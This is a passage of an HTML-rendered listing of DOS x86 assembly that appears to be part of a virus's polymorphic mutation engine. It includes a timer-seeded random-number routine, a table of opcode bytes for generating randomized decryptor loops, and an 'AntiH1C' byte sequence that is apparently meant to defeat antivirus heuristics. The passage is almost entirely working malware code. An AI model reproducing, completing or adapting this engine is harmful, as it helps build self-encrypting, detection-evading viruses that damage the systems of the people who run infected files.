</span><span class="sc5">NoPrefix</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckBp</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">RandSeed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; For random number generator</span><span class="sc0">

</span><span class="sc5">Randomize</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get from timer current time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                    </span><span class="sc1">; Store time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Randomize</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">getrnd</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; Get's random value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Save used registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; save limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Lets make some manipulations</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; with old random value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Exchange it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Rotate it</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">62e9h</span><span class="sc0">   </span><span class="sc1">; Add it</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3619h</span><span class="sc0">
                    </span><span class="sc1">; Store new value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; If we divide by maximum needed</span><span class="sc0">
                    </span><span class="sc1">; value , in Dx we would get</span><span class="sc0">
                    </span><span class="sc1">; number which in area of 0 &lt;-&gt; Limit</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">YeapLimit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoLimit</span><span class="sc0">
</span><span class="sc5">YeapLimit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">NoLimit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; return modulus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">getrnd</span><span class="sc0">      </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CTbl</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">31h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">29h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetMax</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetRnd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetMax</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Decryptor</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc0">        </span><span class="sc1">; Call</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; Pop Pointer</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">; Sub pointer</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Add pointer</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; Mov Counter</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; Mov Keyword</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0">     </span><span class="sc1">; Xor/Add/Sub...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc0">     </span><span class="sc1">; Dec counter</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Inc Pointer</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Inc Pointer</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Add Keyword</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Bh</span><span class="sc0">     </span><span class="sc1">; Or Counter,Counter</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">75h</span><span class="sc0">     </span><span class="sc1">; Jne</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; Jmp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; Jmp</span><span class="sc0">

</span><span class="sc5">AntiH1C</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">; Mov Ax,1200h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">    </span><span class="sc1">; Int 2Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; Mov Dh,0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Sub Dx,0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc0">      </span><span class="sc1">; Add Pointer,Ax</span><span class="sc0">
</span></div></body>
</html>
